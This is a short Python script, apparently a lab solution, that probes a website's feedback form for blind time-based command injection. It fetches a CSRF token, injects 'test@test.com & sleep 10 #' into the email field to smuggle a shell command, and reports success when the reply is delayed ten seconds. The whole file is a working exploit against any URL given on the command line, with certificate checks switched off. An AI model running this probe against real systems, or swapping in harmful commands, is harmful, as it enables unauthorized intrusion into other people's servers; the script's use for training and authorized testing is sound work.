import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf_token(s,url):
    feedback_path ='/feedback'
    re = s.get(url+feedback_path,verify=False,proxies=proxies)
    soup = BeautifulSoup(re.text,'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def check_commmand_injection(s,url):
    path = '/feedback/submit'
    command_injection = 'test%40test.com & sleep 10 #'
    csrf_token = get_csrf_token(s,url)
    data = {'csrf':csrf_token,'name':'test','email':command_injection,'subject':'test','message':'test'}
    res = s.post(url+path,data=data,verify=False,proxies=proxies)
    if (res.elapsed.total_seconds() >=10):
        print("(+) Exploited successfully")
        print("(+) Email field vulnerable to time-based command injection")
    else:
        print("(+) Exploited unsuccessfully")
        print("(+) Email field not-vulnerable to time-based command injection")
    

def main():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to time-based command injection...")

    s = requests.session()
    check_commmand_injection(s,url)

if __name__ == "__main__":
    main()